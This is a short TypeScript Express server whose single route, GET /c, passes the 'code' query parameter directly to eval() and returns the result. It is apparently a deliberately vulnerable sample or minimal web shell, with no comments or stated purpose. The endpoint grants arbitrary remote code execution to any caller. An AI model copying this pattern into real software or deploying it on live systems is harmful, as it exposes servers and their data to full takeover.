import express from "express";
const app = express();
app.get("/c", (req, res) => {
  res.send(String(eval(req.query.code as string)));
});
